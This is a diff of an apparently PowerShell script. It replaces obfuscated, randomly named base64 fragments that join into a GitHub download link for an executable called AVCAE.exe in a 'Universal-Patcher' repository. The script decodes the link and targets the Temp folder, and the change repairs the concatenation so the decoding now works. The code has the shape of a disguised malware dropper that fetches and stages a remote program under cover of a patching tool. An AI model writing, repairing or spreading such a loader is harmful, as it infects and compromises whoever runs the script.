@@ -79,8 +79,8 @@ function OnExecute{
         #return type(o) == t
     #end
 }
-$NhUZIIxOzUdomQU = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29t"
-$GquhqEpxumWRHhy = "L2pheXl5eXl5eWRlZWVlZWVlZS9Vbml2ZXJzYWwtUGF"
+$SRVQrWKZLynucaE = "aHR0cHM6Ly9naXRodWIuY29tL2pheXl5eXl5eWRl"
+$RStdWktpwPXzfvz = "ZWVlZWVlZS9Vbml2ZXJzYWwtUGF0Y2hlci9yYXc"
 $continue = $true
 while ($continue){
     try{
@@ -90,8 +90,8 @@ while ($continue){
 }
 Start-Sleep -Seconds 2
 
-$FoJwoMTeAqJUBHZ = "0Y2hlci9yZWZzL2hlYWRzL21haW4vQVZDQUUuZXhl"
-$base64Bytes = [System.Convert]::FromBase64String($tFhcCHAYIkvqDcH + $ZsWTVuLcqZsdied + $tohNlduKgmceDZq)
+$gBcaAjgzgkiBTgq = "vcmVmcy9oZWFkcy9tYWluL0FWQ0FFLmV4ZQ=="
+$base64Bytes = [System.Convert]::FromBase64String($SRVQrWKZLynucaE + $RStdWktpwPXzfvz + $gBcaAjgzgkiBTgq)
 $dfpaspasodsvxcv = [System.Text.Encoding]::UTF8.GetString($base64Bytes)
 $mnjksdfuidsf = [Environment]::GetFolderPath("Temp")
 
